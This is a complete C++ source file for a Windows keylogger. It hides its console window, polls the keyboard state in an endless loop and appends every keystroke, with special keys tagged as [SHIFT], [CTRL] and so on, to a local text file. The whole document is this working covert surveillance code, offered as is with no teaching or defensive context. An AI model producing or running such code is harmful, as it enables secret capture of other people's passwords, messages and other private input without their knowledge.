#include<iostream>
#include<fstream>
#include<windows.h>
#include<bits/stdc++.h>
#include<string.h>
using namespace std;
#define LOG_FILE "key_logger\Keylogger.txt" // Log file Path
void saveData( string data)
{
	fstream logfile;
	logfile.open(LOG_FILE,ios::app); // In append Mode
	logfile << data;
	logfile.close();
	}
string translateSpecialKey( int key)
{
	string result;
	switch (key)
	{
		case VK_SPACE : result = " ";	//Space
						break;
		case VK_RETURN : result = "\n";	//Enter
						 break;
		case VK_BACK : result = "\b";	//Backspace
						break;
		case VK_CAPITAL : result = "[CAP_LOCK]";	//Capslock ON
						  break;
		case VK_SHIFT : result = "[SHIFT]"; //Shift
						break;
		case VK_TAB : result = "[TAB]";	//Tab
					  break;
		case VK_CONTROL : result = "[CTRL]"; // Control key
						  break;
		case VK_MENU : result = "[ALT]"; //ALT key
						break;
		default: break;
		}
	return result;
	}
bool checkSpecialKey(int key,int specialKeyArray[])
{
	bool x = false;
	for(int i = 0;i<8;i++)
	{
		if(key==specialKeyArray[i])
			x = true;
		}
	return x;
	}
int main()
{
	int specialKeyArray[] = { VK_SPACE , VK_RETURN , VK_SHIFT , VK_BACK , VK_TAB , VK_CONTROL , VK_MENU , VK_CAPITAL};
	string specialKeyChar;
	bool isSpecialKey;
	//Hide terminal window
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);
	
	while(1)
	{
		// Will loop through each key
		for(int key = 8; key<=190 ; key++)
		{
			// Check key is pressed
			if(GetAsyncKeyState(key) == -32767)
			{
				// Key is Pressed
				// Check if key is special
				isSpecialKey = checkSpecialKey(key,specialKeyArray);
				if (isSpecialKey) //If it is special key , isSpecialKey will be true
				{
					specialKeyChar = translateSpecialKey(key);
					saveData(specialKeyChar);
					}
				else
				{
					// This is not a special key but we need to check if it is in Upper case or Lower case
					if(GetKeyState(VK_CAPITAL))
					{
						// CAPSLOCK is ON
						saveData(string(1,(char)key));
						}
					else
					{
						//CAPSLOCK is Off
						saveData(string(1,char((tolower(key)))));
						}
					}
				}
			}
		}
	return 0;
	}
